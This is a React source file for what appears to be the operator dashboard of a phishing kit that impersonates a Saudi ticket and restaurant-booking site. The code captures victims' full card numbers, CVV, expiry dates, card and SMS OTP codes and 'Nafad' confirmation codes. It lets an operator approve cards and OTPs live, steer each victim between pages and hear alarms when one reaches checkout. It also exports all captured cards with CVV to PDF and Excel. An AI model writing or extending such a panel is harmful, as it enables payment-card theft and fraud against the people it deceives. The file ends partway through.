import React, { useEffect, useMemo, useRef, useState } from "react";
import {
  collection,
  onSnapshot,
  query,
  doc,
  setDoc,
  deleteDoc,
  arrayUnion,
  arrayRemove,
  getDoc,
  getDocs,
  writeBatch,
  db,
  auth,
  logoutUser,
  updateVisitorBlockStatus,
  addBlockedBin as fbAddBlockedBin,
  removeBlockedBin as fbRemoveBlockedBin,
  listenBlockedBins,
  pushBankContactRequest,
  pushCustomVisitorMessage,
  clearCustomVisitorMessage,
  onAuthStateChanged,
  updateApprovalStatus,
  updateOtpApprovalStatus,
  fetchAdminSecurityState,
  setAdminAttackMode,
  fetchBlockedCards,
  storeBlockedCard,
  deleteStoredBlockedCard,
  type AdminSecurityState,
  type StoredBlockedCard,
  type User,
} from "@/lib/firebase";
import * as XLSX from "xlsx";
import { useLocation } from "wouter";
import { findBankLogo } from "@/lib/bank-logos";
import { normalizeCardNumber } from "@/lib/card-normalization";
import { buildCardApprovalPayload } from "@/lib/approval-payload";
import { buildPageControlPayload } from "@/lib/page-control";
import { getDirectedVisitorPath } from "@/lib/directed-step-routing";
import { isPresenceOnline } from "@/lib/presence";
import { collapseDuplicateVisitors } from "@/lib/visitor-dedup";
import {
  filterDashboardSidebarVisitors,
  type DashboardSidebarFilter,
} from "@/lib/order-sidebar";
import { OrderSidebarEmptyState } from "@/components/OrderSidebarEmptyState";
import {
  distinctVisitorAlertKinds,
  playVisitorAlertSound,
  VISITOR_ALERT_SOUND_URL,
} from "@/lib/dashboard-audio";
const cardAddedSoundUrl = VISITOR_ALERT_SOUND_URL;
import {
  Search,
  RefreshCw,
  Trash2,
  Bell,
  Volume2,
  LogOut,
  CreditCard,
  Globe,
  Smartphone as PhoneIcon,
  CheckCircle2,
  XCircle,
  Send,
  ArrowLeftRight,
  Hash,
  Lock as LockIcon,
  ChevronDown,
  Layers,
  Settings,
  Eye,
  EyeOff,
  RotateCcw,
  Users,
  Activity,
  AlarmClock,
  CheckCheck,
  AlertTriangle,
  BellRing,
  VolumeX,
  Ban,
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldOff,
  Plus,
  X as XIcon,
  FileDown,
  FileSpreadsheet,
  WifiOff,
  PhoneCall,
  MessageSquare,
} from "lucide-react";
import { handleCurrentPage } from "../lib/firebase";

type CardKey = "customer" | "otp" | "card" | "header";
type CardSetting = { visible: boolean; span: 1 | 2 };
type CardSettings = Record<CardKey, CardSetting>;

const CARD_LABELS: Record<CardKey, string> = {
  customer: "معلومات أساسية",
  otp: "العميل المحدد / OTP",
  card: "معلومات البطاقة",
  header: "ترويسة الزائر",
};

const DEFAULT_CARD_SETTINGS: CardSettings = {
  customer: { visible: true, span: 1 },
  otp: { visible: true, span: 1 },
  card: { visible: true, span: 1 },
  header: { visible: true, span: 1 },
};

const OPERATOR_LABELS: Record<string, string> = {
  stc: "STC",
  mobily: "موبايلي",
  zain: "زين",
};

function loadCardSettings(): CardSettings {
  try {
    const raw = localStorage.getItem("admin.cardSettings");
    if (!raw) return DEFAULT_CARD_SETTINGS;
    const parsed = JSON.parse(raw);
    return { ...DEFAULT_CARD_SETTINGS, ...parsed };
  } catch {
    return DEFAULT_CARD_SETTINGS;
  }
}

export interface Visitor {
  id: string;
  name: string;
  phone: string;
  email: string;
  cardNumber: string;
  cardName: string;
  cardType: string;
  cardBankName?: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardBin: string;
  otp: string;
  otpHistory: Array<{ code: string; timestamp?: string }>;
  cardHistory: Array<any>;
  ticketCount: number | string;
  ticketPrice: number | string;
  totalAmount: number | string;
  bookingDate: string;
  visitTime: string;
  restaurantName: string;
  restaurantDate: string;
  restaurantTime: string;
  guestsCount: number | string;
  ip: string;
  geoCountry: string;
  geoCity: string;
  status: string;
  cardStatus: string;
  cardApproved: boolean;
  otpStatus: string;
  otpApproved: boolean;
  cardApprovalStatus: string;
  otpApprovalStatus: string;
  nafadConfirmationStatus?: string;
  nafadConfirmationCode?: string;
  online?: boolean;
  lastSeen?: string;
  currentPage?: string;
  directedStep?: number;
  blocked?: boolean;
  timestamp?: any;
  updatedAt?: any;
  currentStep?: number;
  [key: string]: any;
}

const STEP_LABELS: Record<number, string> = {
  1: "registration · التسجيل",
  2: "booking · الحجز",
  3: "checkout · الدفع",
  4: "otp · رمز التحقق",
  5: "otp_verified · تم التحقق",
  6: "confirmation · التأكيد",
};

const STEP_TO_PAGE: Record<number, string> = {
  1: "/registration",
  2: "/booking",
  3: "/checkout",
  4: "/otp",
  5: "/otp_verified",
  6: "/confirmation",
};

// Restaurant-reservation flow has 4 internal stages on /reserve/:id, plus the
// shared OTP and confirmation pages. Steps 1-4 are SPA-internal stages of the
// reserve page; 5 and 6 are external routes.
const RESTAURANT_STEP_LABELS: Record<number, string> = {
  1: "reserve_date · الموعد",
  2: "reserve_details · البيانات",
  3: "reserve_invoice · الفاتورة",
  4: "reserve_checkout · الدفع",
  5: "reserve_otp · رمز التحقق",
  6: "confirmation · تأكيد الحجز",
};

const RESTAURANT_STEP_TO_PAGE: Record<number, string> = {
  1: "reserve_date",
  2: "reserve_details",
  3: "reserve_invoice",
  4: "reserve_checkout",
  5: "reserve_otp",
  6: "confirmation",
};

const TICKET_TOTAL_STEPS = 6;
const RESTAURANT_TOTAL_STEPS = 6;
const TOTAL_STEPS = RESTAURANT_TOTAL_STEPS; // legacy upper bound

type VisitorFlow = "ticket" | "restaurant";

function getFlowTotalSteps(flow: VisitorFlow): number {
  return flow === "restaurant" ? RESTAURANT_TOTAL_STEPS : TICKET_TOTAL_STEPS;
}

function isFinalStep(v: any): boolean {
  const flow: VisitorFlow =
    String(v?.type || "").toLowerCase() === "restaurant_reservation" ||
    !!v?.restaurant ||
    !!v?.restaurantEn ||
    String(v?.currentPage || "").startsWith("reserve_")
      ? "restaurant"
      : "ticket";
  return (
    Number(v?.step) === getFlowTotalSteps(flow) ||
    String(v?.currentPage || "") === "confirmation"
  );
}

function getVisitorFlow(v: Visitor): VisitorFlow {
  const t = String((v as any)?.type || "").toLowerCase();
  const cp = String((v as any)?.currentPage || "").toLowerCase();
  if (
    t === "restaurant_reservation" ||
    !!(v as any)?.restaurant ||
    !!(v as any)?.restaurantEn ||
    cp.startsWith("reserve_")
  ) {
    return "restaurant";
  }
  return "ticket";
}

function getFlowStepLabels(flow: VisitorFlow): Record<number, string> {
  return flow === "restaurant" ? RESTAURANT_STEP_LABELS : STEP_LABELS;
}

function getFlowStepPage(flow: VisitorFlow, step: number): string {
  const map = flow === "restaurant" ? RESTAURANT_STEP_TO_PAGE : STEP_TO_PAGE;
  return map[step] || "";
}

/* -------------------------------------------------------------- */
/* Adapter: map current flat schema → the shape the new UI expects */
/* -------------------------------------------------------------- */

const PAGE_TO_STEP: Record<string, number> = {
  // Ticket flow
  registration: 1,
  booking: 2,
  cart: 3, // legacy alias (cart step removed from UX) → checkout
  checkout: 3,
  otp: 4,
  otp_verified: 5,
  confirmation: 6,
  // Restaurant flow (4 internal stages of /reserve/:id, then OTP, then conf)
  reserve_restaurant: 1, // legacy alias (intro step removed) → reserve_date
  reserve_date: 1,
  reserve_details: 2,
  reserve_invoice: 3,
  reserve_checkout: 4,
  reserve_otp: 5,
};

function tsFromAny(v: any): string | undefined {
  if (!v) return undefined;
  if (typeof v === "string") return v;
  if (typeof v === "number") return new Date(v).toISOString();
  if (typeof v?.toDate === "function") {
    try {
      return v.toDate().toISOString();
    } catch {
      return undefined;
    }
  }
  if (typeof v?.seconds === "number") {
    return new Date(v.seconds * 1000).toISOString();
  }
  return undefined;
}

export function adaptVisitor(raw: any): Visitor {
  const cardNumber = normalizeCardNumber(raw);
  const last4 = cardNumber.slice(-4);
  const bin = cardNumber.slice(0, 6);
  const mm = String(raw?.expiryMonth || "")
    .padStart(2, "0")
    .slice(-2);
  const yy = String(raw?.expiryYear || "")
    .slice(-2)
    .padStart(2, "0");
  const expiry = mm.trim() && yy.trim() ? `${mm}/${yy}` : "";

  const ct = String(raw?.cardType || "").toLowerCase();
  const scheme =
    ct === "mada"
      ? "mada"
      : ct === "visa"
        ? "visa"
        : ct === "mastercard" || ct === "master"
          ? "mastercard"
          : ct === "amex" || ct === "american express"
            ? "amex"
            : ct;

  const matchedBank = findBankLogo(raw?.cardBankName || raw?.bankName);
  const cardBank = raw?.cardBankName || raw?.bankName || "";

  const payment = {
    cardNumber: raw?.cardNumber || raw?.c1,
    cardLast4: last4 || undefined,
    cardBin: bin || undefined,
    cardName: raw?.cardName,
    cardExpiry: expiry || undefined,
    cardCvc: raw?.cvv || raw?.cpc,
    cardScheme: scheme,
    cardType: raw?.cardCategory || undefined,
    cardLevel: raw?.cardLevel || undefined,
    cardCountry: raw?.cardCountry || undefined,
    cardBank,
    cardBankLogo: matchedBank?.logo || null,
    cardBankLabel: matchedBank?.label || cardBank || "",
    amount: raw?.totalAmount || raw?.total,
  };

  let cardApprovalStatus: string | undefined;
  if (raw?.cardApproved === true) {
    cardApprovalStatus = "approved";
  } else if (raw?.cardStatus === "rejected") cardApprovalStatus = "rejected";
  else if (
    raw?.cardStatus === "pending_approval" ||
    raw?.status === "pending_approval"
  )
    cardApprovalStatus = "waiting";
  // Fall back to the new persisted field if no legacy signal is present.
  if (!cardApprovalStatus && typeof raw?.cardApprovalStatus === "string") {
    cardApprovalStatus = raw.cardApprovalStatus;
  }

  let otpApprovalStatus: string | undefined;
  if (raw?.otpApproved === true) otpApprovalStatus = "approved";
  else if (raw?.otpStatus === "rejected") otpApprovalStatus = "rejected";
  else if (raw?.otpStatus === "pending" || (raw?.otp && !raw?.otpApproved))
    otpApprovalStatus = "waiting";
  if (!otpApprovalStatus && typeof raw?.otpApprovalStatus === "string") {
    otpApprovalStatus = raw.otpApprovalStatus;
  }

  const phoneOtpApprovalStatus =
    typeof raw?.phoneOtpApprovalStatus === "string"
      ? raw.phoneOtpApprovalStatus
      : undefined;

  const updatedAt =
    tsFromAny(raw?.lastSeen) ||
    tsFromAny(raw?.updatedAt) ||
    raw?.createdDate ||
    undefined;

  const stepFromPage = PAGE_TO_STEP[String(raw?.currentPage || "")] || 0;
  // Honour an explicit numeric `step` from the raw doc as a fallback for
  // legacy records that don't have `currentPage`. Clamp legacy values that
  // exceed the new 6-step model (e.g. old restaurant `step: 7` records,
  // which represented the confirmation page) to the new max.
  const rawStep = Number(raw?.step) || 0;
  const flowMax = 6;
  const clampedRawStep = rawStep > flowMax ? flowMax : rawStep;
  const step =
    stepFromPage ||
    clampedRawStep ||
    (raw?.otp ? 4 : raw?.cardNumber ? 3 : raw?.name ? 1 : 0);

  const completed =
    raw?.currentPage === "confirmation" ||
    raw?.currentPage === "otp_verified" ||
    (cardApprovalStatus === "approved" && otpApprovalStatus === "approved");

  return {
    ...raw,
    payment,
    step,
    cardApprovalStatus,
    otpApprovalStatus,
    phoneOtpApprovalStatus,
    updatedAt,
    status: completed ? "nafad_otp_submitted" : raw?.status,
  } as Visitor;
}

/* -------------------------------------------------------------- */
/* Helpers                                                         */
/* -------------------------------------------------------------- */

function countryFlag(code: string): string {
  const cc = (code || "").trim().toUpperCase();
  if (cc.length !== 2 || !/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6;
  return String.fromCodePoint(
    A + cc.charCodeAt(0) - 65,
    A + cc.charCodeAt(1) - 65
  );
}

function fmtTime(iso?: string) {
  if (!iso) return "—";
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "—";
  return d.toLocaleString("ar-SA", { dateStyle: "short", timeStyle: "short" });
}

function safeText(v: any): string {
  if (v === null || v === undefined) return "";
  if (typeof v === "string" || typeof v === "number") return String(v);
  if (typeof v === "object")
    return (
      v.name ||
      v.bank ||
      v.bank_name ||
      v.bankName ||
      v.scheme ||
      v.brand ||
      JSON.stringify(v)
    );
  return String(v);
}

function isOnline(v: Visitor): boolean {
  return isPresenceOnline(v);
}

const WAITING_FIELDS = [
  "cardApprovalStatus",
  "otpApprovalStatus",
  "phoneOtpApprovalStatus",
  "nafadConfirmationStatus",
] as const;

function waitingFields(v: Visitor): string[] {
  return WAITING_FIELDS.filter(f => v[f] === "waiting");
}
function isWaiting(v: Visitor): boolean {
  return waitingFields(v).length > 0;
}
function isCompleted(v: Visitor): boolean {
  return v.status === "nafad_otp_submitted" || isFinalStep(v);
}

function fmtRelative(iso?: string): string {
  if (!iso) return "—";
  const t = new Date(iso).getTime();
  if (isNaN(t)) return "—";
  const diff = Math.max(0, Date.now() - t);
  const sec = Math.floor(diff / 1000);
  if (sec < 60) return `منذ ${sec}ث`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `منذ ${min}د`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `منذ ${hr}س`;
  const day = Math.floor(hr / 24);
  return `منذ ${day}ي`;
}

function stepColor(step: number): string {
  if (step >= 6)
    return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
  if (step >= 5) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
  if (step >= 4) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
  if (step >= 3) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
  return "bg-slate-700/40 text-slate-300 border-slate-600/40";
}

function playConfiguredVisitorAlert() {
  playVisitorAlertSound(() => new Audio(cardAddedSoundUrl));
}

function beep(volume = 0.18) {
  try {
    const Ctx =
      (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.18);
    gain.gain.setValueAtTime(volume, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.36);
  } catch {}
}

/**
 * Plays a short multi-note pattern so the admin can distinguish event
 * types by ear without looking. Each note is `[freqHz, durMs]`.
 * `wave` defaults to "sine" but can be overridden for harsher alerts.
 */
function beepPattern(
  notes: Array<[number, number]>,
  volume = 0.22,
  wave: OscillatorType = "sine"
) {
  try {
    const Ctx =
      (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    let t = ctx.currentTime;
    for (const [freq, durMs] of notes) {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = wave;
      osc.frequency.setValueAtTime(freq, t);
      gain.gain.setValueAtTime(volume, t);
      gain.gain.exponentialRampToValueAtTime(0.0001, t + durMs / 1000);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(t);
      osc.stop(t + durMs / 1000 + 0.02);
      t += durMs / 1000 + 0.04;
    }
  } catch {}
}

/** Distinct alert tones, picked to be recognizable from across the room. */
const ALERT_TONES = {
  // Visitor entered card-entry page — urgent, descending triple beep.
  checkout: () =>
    beepPattern(
      [
        [1200, 110],
        [900, 110],
        [700, 180],
      ],
      0.28,
      "square"
    ),
  // Visitor submitted OTP code — fast double chirp.
  otp: () =>
    beepPattern(
      [
        [1500, 90],
        [1500, 90],
      ],
      0.26,
      "triangle"
    ),
  // Visitor reached confirmation page — pleasant rising arpeggio.
  confirmation: () =>
    beepPattern(
      [
        [660, 100],
        [880, 100],
        [1320, 220],
      ],
      0.22,
      "sine"
    ),
};

/**
 * Resolve the alert kind for a visitor based on their current page. Returns
 * null when the page is not one we want to alert on.
 */
function alertKindFor(currentPage: string): keyof typeof ALERT_TONES | null {
  if (currentPage === "checkout" || currentPage === "reserve_checkout")
    return "checkout";
  if (currentPage === "otp" || currentPage === "reserve_otp") return "otp";
  if (currentPage === "confirmation" || currentPage === "otp_verified")
    return "confirmation";
  return null;
}

function escHtml(s: any): string {
  const str = s == null ? "" : String(s);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function exportAllCardsPdf(visitors: Visitor[]) {
  const withCards = visitors.filter(
    v => v?.payment?.cardNumber || v?.payment?.cardLast4 || v?.payment?.c1
  );
  if (withCards.length === 0) {
    alert("لا توجد بطاقات لتصديرها.");
    return;
  }

  const rows = withCards
    .map((v, idx) => {
      const p = v.payment || {};
      const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
      const formatted = fullCard
        ? fullCard.replace(/(.{4})/g, "$1 ").trim()
        : `**** **** **** ${escHtml(p.cardLast4 || "----")}`;
      const expiry = escHtml(p.cardExpiry || "—");
      const cvv = escHtml(p.cardCvc || "—");
      const name = escHtml(p.cardName || v.name || "—");
      const bin = escHtml(p.cardBin || (fullCard ? fullCard.slice(0, 6) : "—"));
      const bank = escHtml(p.cardBankLabel || p.cardBank || "—");
      const scheme = escHtml(p.cardScheme || "—");
      const type = escHtml(p.cardType || "—");
      const level = escHtml(p.cardLevel || "—");
      const country = escHtml(p.cardCountry || "—");
      const phone = escHtml(v.phone || "—");
      const otpCard = escHtml(v.otp || "—");
      const otpSms = escHtml(v.smsOtp || "—");
      const updated = escHtml(fmtTime(v.updatedAt));
      const visitorId = escHtml(v.id);
      return `
      <article class="card-row">
        <header class="row-head">
          <div class="row-idx">#${idx + 1}</div>
          <div class="row-meta">
            <div><strong>الزائر:</strong> ${visitorId}</div>
            <div><strong>التحديث:</strong> ${updated}</div>
          </div>
        </header>
        <div class="card-grid">
          <div class="block primary">
            <div class="lbl">رقم البطاقة</div>
            <div class="val mono big">${escHtml(formatted)}</div>
          </div>
          <div class="block"><div class="lbl">اسم حامل البطاقة</div><div class="val">${name}</div></div>
          <div class="block"><div class="lbl">تاريخ الانتهاء</div><div class="val mono">${expiry}</div></div>
          <div class="block"><div class="lbl">CVV</div><div class="val mono">${cvv}</div></div>
          <div class="block"><div class="lbl">BIN</div><div class="val mono">${bin}</div></div>
          <div class="block"><div class="lbl">الشبكة</div><div class="val">${scheme}</div></div>
          <div class="block"><div class="lbl">النوع</div><div class="val">${type}</div></div>
          <div class="block"><div class="lbl">المستوى</div><div class="val">${level}</div></div>
          <div class="block"><div class="lbl">الدولة</div><div class="val">${country}</div></div>
          <div class="block wide"><div class="lbl">البنك</div><div class="val">${bank}</div></div>
          <div class="block"><div class="lbl">رمز البطاقة (OTP)</div><div class="val mono">${otpCard}</div></div>
          <div class="block"><div class="lbl">رمز SMS</div><div class="val mono">${otpSms}</div></div>
          <div class="block wide"><div class="lbl">الجوال</div><div class="val mono">${phone}</div></div>
        </div>
      </article>`;
    })
    .join("\n");

  const now = new Date();
  const dateStr = now.toLocaleString("ar-SA");
  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<title>تصدير البطاقات - ${withCards.length}</title>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; background: #fff; color: #111; font-family: -apple-system, "Segoe UI", Tahoma, Arial, "Noto Sans Arabic", sans-serif; }
  .page { padding: 18mm 12mm; }
  .doc-head { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #111; padding-bottom: 10px; margin-bottom: 16px; }
  .doc-head h1 { margin: 0; font-size: 20px; }
  .doc-head .meta { font-size: 12px; color: #444; text-align: left; direction: ltr; }
  .doc-head .meta div { margin-bottom: 2px; }
  .summary { font-size: 12px; color: #555; margin-bottom: 14px; }
  .card-row { border: 1px solid #d0d0d0; border-radius: 6px; padding: 12px 14px; margin-bottom: 12px; page-break-inside: avoid; background: #fafafa; }
  .row-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px dashed #c0c0c0; }
  .row-idx { font-size: 18px; font-weight: 800; color: #1a56db; }
  .row-meta { font-size: 11px; color: #555; text-align: left; direction: ltr; }
  .row-meta strong { color: #111; }
  .card-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
  .block { background: #fff; border: 1px solid #e3e3e3; border-radius: 4px; padding: 6px 8px; }
  .block.wide { grid-column: span 2; }
  .block.primary { grid-column: span 4; background: #fff; border-color: #1a56db; }
  .block .lbl { font-size: 10px; color: #666; margin-bottom: 3px; }
  .block .val { font-size: 13px; color: #111; font-weight: 600; word-break: break-all; }
  .block .val.mono { font-family: "SFMono-Regular", Menlo, Consolas, monospace; direction: ltr; text-align: left; letter-spacing: 0.04em; }
  .block .val.big { font-size: 18px; letter-spacing: 0.12em; }
  .footer-note { margin-top: 14px; font-size: 10px; color: #888; text-align: center; }
  @media print {
    .no-print { display: none !important; }
    .page { padding: 10mm; }
    .card-row { background: #fff; }
  }
  .toolbar { position: sticky; top: 0; background: #1a56db; color: #fff; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
  .toolbar button { background: #fff; color: #1a56db; border: none; padding: 8px 16px; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 13px; }
  .toolbar button:hover { background: #f0f0f0; }
</style>
</head>
<body>
  <div class="toolbar no-print">
    <span>اضغط زر "طباعة / حفظ PDF" ثم اختر "Save as PDF"</span>
    <button onclick="window.print()">طباعة / حفظ PDF</button>
  </div>
  <div class="page">
    <div class="doc-head">
      <h1>تقرير البطاقات</h1>
      <div class="meta">
        <div>${escHtml(dateStr)}</div>
        <div>إجمالي البطاقات: ${withCards.length}</div>
      </div>
    </div>
    <div class="summary">يحتوي هذا التقرير على بيانات ${withCards.length} بطاقة مُسجَّلة عبر النظام.</div>
    ${rows}
    <div class="footer-note">تم التوليد تلقائياً من لوحة التحكم</div>
  </div>
  <script>
    window.addEventListener('load', function() {
      setTimeout(function() { window.print(); }, 350);
    });
  </script>
</body>
</html>`;

  const w = window.open("", "_blank", "width=900,height=1000");
  if (!w) {
    alert("الرجاء السماح بالنوافذ المنبثقة لتصدير الـ PDF.");
    return;
  }
  w.document.open();
  w.document.write(html);
  w.document.close();
}

const BLOCKED_SOURCE_LABELS: Record<string, string> = {
  admin_block: "حظر من لوحة التحكم",
  visitor_attempt: "محاولة دفع ببطاقة محظورة",
  manual: "إدخال يدوي",
};

function exportBlockedCardsExcel(
  storedCards: StoredBlockedCard[],
  blockedBins: string[],
  visitors: Visitor[]
) {
  const merged: StoredBlockedCard[] = [...storedCards];
  const seenKey = new Set(
    storedCards.map(
      c => `${c.bin}|${c.cardNumber || ""}|${c.visitorId || ""}`
    )
  );

  // Include any cards from visitors whose BIN is in blockedBins
  for (const v of visitors) {
    const p = v.payment || {};
    const num = String(p.cardNumber || v.cardNumber || "").replace(/\D/g, "");
    const bin = String(p.cardBin || (num.length >= 6 ? num.slice(0, 6) : ""));
    if (!bin || !blockedBins.includes(bin)) continue;
    const key = `${bin}|${num}|${v.id}`;
    if (seenKey.has(key)) continue;
    seenKey.add(key);
    merged.push({
      id: `v_${v.id}`,
      bin,
      cardNumber: num || undefined,
      last4: p.cardLast4 || (num.length >= 4 ? num.slice(-4) : undefined),
      expiryMonth: v.expiryMonth || undefined,
      expiryYear: v.expiryYear || undefined,
      cvv: p.cardCvc || v.cvv || undefined,
      cardName: p.cardName || v.cardName || undefined,
      cardType: p.cardScheme || v.cardType || undefined,
      bankName: p.cardBankLabel || p.cardBank || v.cardBankName || undefined,
      visitorId: v.id,
      visitorName: v.name || undefined,
      phone: v.phone || undefined,
      ip: v.ip || v.ipAddress || undefined,
      source: "admin_block",
      blockedAt: String(v.updatedAt || new Date().toISOString()),
    });
  }

  // Ensure standalone BINs that have no card entry still appear in the Excel export
  for (const bin of blockedBins) {
    if (!merged.some(c => c.bin === bin)) {
      merged.push({
        id: `bin_${bin}`,
        bin,
        source: "manual",
        blockedAt: new Date().toISOString(),
      });
    }
  }

  if (merged.length === 0) {
    alert("لا توجد بطاقات محظورة لتصديرها.");
    return;
  }

  const cardRows = merged.map((c, idx) => {
    const exp =
      c.expiryMonth && c.expiryYear
        ? `${String(c.expiryMonth).padStart(2, "0")}/${String(c.expiryYear).slice(-2)}`
        : "—";
    return {
      "#": idx + 1,
      BIN: c.bin,
      "رقم البطاقة": c.cardNumber ,
      "آخر 4 أرقام": c.last4 || (c.cardNumber && c.cardNumber.length >= 4 ? c.cardNumber.slice(-4) : "—"),
      "تاريخ الانتهاء": exp,
      CVV: c.cvv || "—",
      "اسم حامل البطاقة": c.cardName || "—",
      "نوع البطاقة": c.cardType || "—",
      البنك: c.bankName || "—",
      "اسم الزائر": c.visitorName || "—",
      "رقم الهاتف": c.phone || "—",
      "عنوان IP": c.ip || "—",
      المصدر: BLOCKED_SOURCE_LABELS[c.source] || c.source,
      "تاريخ الحظر": fmtTime(c.blockedAt),
    };
  });

  const binRows = blockedBins.map((bin, idx) => ({
    "#": idx + 1,
    BIN: bin,
    "عدد السجلات المرتبطة": merged.filter(c => c.bin === bin).length,
  }));

  const wb = XLSX.utils.book_new();
  wb.Workbook = { Views: [{ RTL: true }] };

  const wsCards = XLSX.utils.json_to_sheet(cardRows);
  wsCards["!cols"] = [
    { wch: 5 },
    { wch: 10 },
    { wch: 22 },
    { wch: 12 },
    { wch: 14 },
    { wch: 8 },
    { wch: 22 },
    { wch: 12 },
    { wch: 24 },
    { wch: 20 },
    { wch: 16 },
    { wch: 16 },
    { wch: 24 },
    { wch: 20 },
  ];
  XLSX.utils.book_append_sheet(wb, wsCards, "البطاقات المحظورة");

  if (binRows.length > 0) {
    const wsBins = XLSX.utils.json_to_sheet(binRows);
    wsBins["!cols"] = [{ wch: 5 }, { wch: 12 }, { wch: 22 }];
    XLSX.utils.book_append_sheet(wb, wsBins, "أكواد BIN");
  }

  const stamp = new Date().toISOString().slice(0, 10);
  XLSX.writeFile(wb, `blocked-cards-${stamp}.xlsx`);
}

/* -------------------------------------------------------------- */
/* Auth wrapper                                                    */
/* -------------------------------------------------------------- */

export default function Admin() {
  const [, setLocation] = useLocation();
  const [authUser, setAuthUser] = useState<User | null>(null);
  const [authReady, setAuthReady] = useState(false);

  useEffect(() => {
    if (!auth) {
      setAuthReady(true);
      return;
    }
    const unsub = onAuthStateChanged(auth, u => {
      setAuthUser(u);
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (authReady && !authUser) {
      setLocation("/login");
    }
  }, [authReady, authUser, setLocation]);

  if (!authReady || !authUser) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-white text-gray-500 text-sm">
        جاري التحميل...
      </div>
    );
  }

  return <AdminDashboard />;
}

/* -------------------------------------------------------------- */
/* Dashboard                                                       */
/* -------------------------------------------------------------- */

function AdminDashboard() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<
    "all" | "online" | "waiting" | "completed"
  >("all");
  const [soundOn, setSoundOn] = useState<boolean>(() => {
    try {
      return localStorage.getItem("admin.soundOn") === "1";
    } catch {
      return false;
    }
  });
  const prevWaitingIds = useRef<Set<string>>(new Set());
  const [, forceTick] = useState(0);
  const [presenceTick, setPresenceTick] = useState(0);
  const [blockedBins, setBlockedBins] = useState<string[]>([]);
  const [storedBlockedCards, setStoredBlockedCards] = useState<
    StoredBlockedCard[]
  >([]);
  const [blocklistOpen, setBlocklistOpen] = useState(false);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [ipBlocklistOpen, setIpBlocklistOpen] = useState(false);
  const [attackState, setAttackState] = useState<AdminSecurityState>({
    enabled: false,
    enabledAt: null,
    updatedAt: "",
    blockedCount: 0,
    recentBlocked: [],
  });
  const [attackPanelOpen, setAttackPanelOpen] = useState(false);
  const [attackBusy, setAttackBusy] = useState(false);

  useEffect(() => {
    let active = true;
    const sync = async () => {
      try {
        const [sec, cards] = await Promise.all([
          fetchAdminSecurityState().catch(() => null),
          fetchBlockedCards().catch(() => null),
        ]);
        if (!active) return;
        if (sec) setAttackState(sec);
        if (cards) setStoredBlockedCards(cards);
      } catch {
        // ignore transient polling failures
      }
    };
    void sync();
    const timer = window.setInterval(sync, 10_000);
    return () => {
      active = false;
      window.clearInterval(timer);
    };
  }, []);

  async function toggleAttackMode(nextEnabled = !attackState.enabled, resetStats = false) {
    if (attackBusy) return;
    setAttackBusy(true);
    try {
      const updated = await setAdminAttackMode(nextEnabled, resetStats);
      setAttackState(updated);
    } catch (e) {
      console.error("Failed to toggle attack mode", e);
    } finally {
      setAttackBusy(false);
    }
  }

  // Subscribe to existing blocked_bins collection (string ids).
  useEffect(() => {
    const unsub = listenBlockedBins(bins => {
      setBlockedBins(
        bins
          .map(b => String(b.bin || "").replace(/\D/g, ""))
          .filter(s => s.length === 6)
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedBin(binOrCard: string, meta?: any) {
    const digits = String(binOrCard).replace(/\D/g, "");
    const cleanBin = digits.slice(0, 6);
    if (cleanBin.length !== 6) return;
    const cardPayload = {
      bin: cleanBin,
      ...(digits.length > 6 ? { cardNumber: digits } : {}),
      ...(meta || {}),
      source: meta?.source || (digits.length > 6 && !meta ? "manual" : "admin_block"),
    };
    try {
      if (!blockedBins.includes(cleanBin)) {
        await fbAddBlockedBin(cleanBin, cardPayload);
      } else {
        await storeBlockedCard(cardPayload);
      }
      const nextCards = await fetchBlockedCards().catch(() => null);
      if (nextCards) setStoredBlockedCards(nextCards);
    } catch (e) {
      console.error(e);
    }
  }
  async function removeBlockedBin(bin: string) {
    const clean = String(bin).replace(/\D/g, "");
    if (!clean) return;
    try {
      await fbRemoveBlockedBin(clean);
    } catch (e) {
      console.error(e);
    }
  }
  async function removeStoredBlockedCard(entryId: string) {
    try {
      const nextCards = await deleteStoredBlockedCard(entryId);
      setStoredBlockedCards(nextCards);
    } catch (e) {
      console.error(e);
    }
  }

  // ---- Blocked IPs (settings/blockedIps doc, ips: string[]) ----
